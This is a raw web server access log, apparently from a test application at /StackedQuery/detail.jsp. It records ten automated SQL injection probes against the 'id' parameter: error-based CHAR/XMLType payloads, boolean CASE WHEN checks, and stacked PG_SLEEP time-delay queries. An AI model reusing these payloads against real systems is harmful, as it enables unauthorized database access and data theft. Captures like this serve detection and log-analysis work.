10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=1%27%20AND%204162%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284162%3D4162%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%20AND%20%27jQeV%27%3D%27jQeV HTTP/1.1" 200 1653
10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=1%29%20AND%201277%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281277%3D1277%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%286611%3D6611 HTTP/1.1" 200 1653
10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=1%20AND%201277%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281277%3D1277%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29 HTTP/1.1" 200 1653
10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=1%20AND%201277%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281277%3D1277%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20bXnJ HTTP/1.1" 200 1653
10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=1%27%29%20AND%201277%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281277%3D1277%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27KXQU%27%3D%27KXQU HTTP/1.1" 200 1653
10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=1%27%20AND%201277%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281277%3D1277%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27OSjw%27%3D%27OSjw HTTP/1.1" 200 1653
10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=%28SELECT%20CONCAT%28CONCAT%28%27qpbkq%27%2C%28CASE%20WHEN%20%288862%3D8862%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qqqzq%27%29%29 HTTP/1.1" 200 1653
10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=1%29%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 200 1653
10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=1%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 200 1653
10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=1%27%29%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 200 1653
